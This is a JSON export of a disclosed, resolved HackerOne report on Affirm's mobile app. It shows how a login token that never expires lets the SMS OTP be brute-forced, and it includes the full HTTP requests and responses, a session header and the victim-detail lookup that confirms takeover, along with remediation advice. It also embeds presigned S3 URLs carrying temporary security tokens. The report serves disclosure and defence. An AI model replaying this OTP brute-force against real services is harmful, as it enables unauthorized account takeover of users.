@@ -1,0 +1,223 @@
+{
+  "id": 766578,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjY1Nzg=",
+  "url": "https://hackerone.com/reports/766578",
+  "title": "Absence of Token expiry leads to Unauthorized login Access",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-31T19:28:39.154Z",
+  "submitted_at": "2019-12-31T19:28:39.154Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yogesh_ojha",
+    "url": "/yogesh_ojha",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 24883,
+    "url": "https://hackerone.com/affirm",
+    "handle": "affirm",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8KSoDJqU7K4QaZkiQ4XzCjuV/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/8KSoDJqU7K4QaZkiQ4XzCjuV/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Affirm",
+      "twitter_handle": "",
+      "website": "http://www.affirm.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-12-01T00:09:45.558Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-30T19:00:30.187Z",
+  "team_member_agreed_on_going_public_at": "2020-12-01T00:09:45.458Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nWhile doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.\n\nThe way affirm mobile login works is that,\n\nUser inputs the phone number\nIt then makes a call to an API endpoint /api/v3/login/phone/\n```\nPOST /api/v3/login/phone/ HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 40\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.13.1\nAffirm-User-Agent: Affirm-Android\n\n{\"channel\":\"sms\",\"address\":\"7022170000\"}\n```\n\nThis endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.\nThe response looks something similar to this\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 31 Dec 2019 11:53:27 GMT\nContent-Type: application/json\nConnection: close\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: XXX=\nAffirm-Client: XXXX-\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c\nStrict-Transport-Security: max-age=86400\nContent-Length: 299\n\n{\"response_url\": \"/api/v3/login/phone/SOMETOKEN\"}\n```\n\nAnother call to the api is made to the URL obtained from the above response_url This API request looks like this\n\n```\nPOST /api/v3/login/phone/SOMETOKEN HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 19\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.62.3\nAffirm-App-Version-Code: 312\nAffirm-OS-Version: 22\n\n{\"response\":\"0000\"}\n```\n\nSince SOMETOKEN in the above request doesn't get expired, this request can be sent to Intruder or similar tools to brute force the response OTP parameter.\nOnce the response is valid, this can be verified by the 200 status obtained in the response and the length of the response.\nLike this,\n{F672314}\n\nThe response will be\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 31 Dec 2019 12:30:58 GMT\nContent-Type: application/json\nConnection: close\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca\nStrict-Transport-Security: max-age=86400\nContent-Length: 109\n\n{\"status\": \"authenticated\", \"token\": null, \"user_id\": \"1479-5770-XGGL\", \"expiration\": \"3019-12-31T17:17:38Z\"}\n```\n\nThis response contains Affirm-Client which is like a session ID, later used to make a request.\n\nTo verify if this is the actual session ID or not, this can be done by making a request to the api\n\n```\nGET /api/v2/users/1479-5770-XGGL HTTP/1.1\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.13.1\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\nAffirm-Platform: android\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.62.3\nAffirm-App-Version-Code: 312\nAffirm-OS-Version: 22\n```\n\nThe user ID can also be obtained from the above response.\n\nIf the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.\n\n```\n{\"phone_number\": {\"phone_number\": \"+1-702-217-0000\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"CNAIG0U1BMPHN5BK\"}, \"status\": \"ACTIVE\", \"name\": {\"last\": \"NEPAK\", \"full\": \"TESTING NEPAK\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"4ZBC33TYEY12SOWP\", \"first\": \"TESTING\"}, \"is_personalized_services_active\": true, \"created\": \"2019-12-31T10:48:00Z\", \"dob\": \"1980-06-23\", \"id\": \"1479-5770-XGGL\", \"address_confirmation_status\": \"not confirmed\", \"address\": {\"city\": \"San Francisco\", \"user_id\": \"1479-5770-XGGL\", \"is_po_box\": false, \"street1\": \"325 Pacific Ave\", \"region1_code\": \"CA\", \"is_military_address\": false, \"postal_code\": \"94111\", \"country_code\": \"USA\", \"id\": \"G2YM6ESBLH36ETLZ\"}, \"user_consented_to_lto\": null, \"email\": {\"verified\": false, \"user_id\": \"1479-5770-XGGL\", \"email\": \"who_has_no_name+0000@wearehackerone.com\", \"id\": \"B9SUH5XOB1559Q8J\"}}\n```\n{F672319}\n\n### Remediation\nRate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.\nThe fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.\n\nLuckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.\n\nOnce this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.\n\nPOC Video\n{F672564}\n-Happy New year team Affirm <3\n\n## Impact\n\nUnauthorized account access, Account takeover",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 672314,
+      "file_name": "1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GawqacC3qzn1LFnHJxLQdqNJ?response-content-disposition=attachment%3B%20filename%3D%221.PNG%22%3B%20filename%2A%3DUTF-8%27%271.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045253Z&X-Amz-Expires=2911&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=410431314f0b69572fbd1e0f3a43d2b40951bc39e01da8fdb2c1b879b6633fcb",
+      "file_size": 27126,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 672319,
+      "file_name": "2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UJcJT6K56pTjFNbhCMGYF5Td?response-content-disposition=attachment%3B%20filename%3D%222.PNG%22%3B%20filename%2A%3DUTF-8%27%272.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045253Z&X-Amz-Expires=2911&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b739af232b092626d34f4d501043ea86b0d360f4637b2a0e4ae8e10560d88e3",
+      "file_size": 89799,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 672564,
+      "file_name": "Screen_Recording_2020-01-01_at_12.47.37_AM.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/68XoqHAqkKbuzMPKzSnm1V9t?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2020-01-01_at_12.47.37_AM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2020-01-01_at_12.47.37_AM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045253Z&X-Amz-Expires=2911&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e00be6496410f712c81b78906d0fa32d384664e984c91f36918ad940c7df311",
+      "file_size": 36255947,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-12-30T19:00:30.287Z",
+  "allow_singular_disclosure_after": -174131543.2317404,
+  "singular_disclosure_allowed": true,
+  "vote_count": 154,
+  "voters": [
+    "k0ns0l",
+    "orange303",
+    "ganeshbagaria",
+    "sw33tlie",
+    "xploiterr",
+    "bendtheory",
+    "vapour",
+    "n0x496n",
+    "dexter0us",
+    "holyfield",
+    "and 144 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 9646,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.affirm.central.audit",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "766578",
+  "votes": 154,
+  "latest_disclosable_activity_at": "2020-12-01T00:09:45.589Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:52:53.677536",
+    "source": "https://hackerone.com/reports/766578.json",
+    "report_id": 766578
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjY1Nzg=",
+    "databaseId": "766578",
+    "title": "Absence of Token expiry leads to Unauthorized login Access",
+    "url": "https://hackerone.com/reports/766578",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-12-01T00:09:45.558Z",
+    "created_at": "2019-12-31T19:28:39.154Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI3",
+      "name": "Improper Authentication - Generic",
+      "external_id": "cwe-287"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": null
+    },
+    "reporter": {
+      "username": "yogesh_ojha"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI0ODgz",
+      "handle": "affirm",
+      "name": "Affirm",
+      "url": "https://hackerone.com/affirm",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xODEzNTU=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-01-11T01:22:12.804Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc2NjU3OA==",
+    "_id": "766578",
+    "disclosed": true,
+    "votes": 154,
+    "latest_disclosable_activity_at": "2020-12-01T00:09:45.589Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjY1Nzg=",
+      "databaseId": "766578",
+      "title": "Absence of Token expiry leads to Unauthorized login Access",
+      "url": "https://hackerone.com/reports/766578",
+      "disclosed_at": "2020-12-01T00:09:45.558Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI0ODgz",
+      "handle": "affirm",
+      "name": "Affirm",
+      "url": "https://hackerone.com/affirm",
+      "currency": "usd"
+    }
+  }
+}
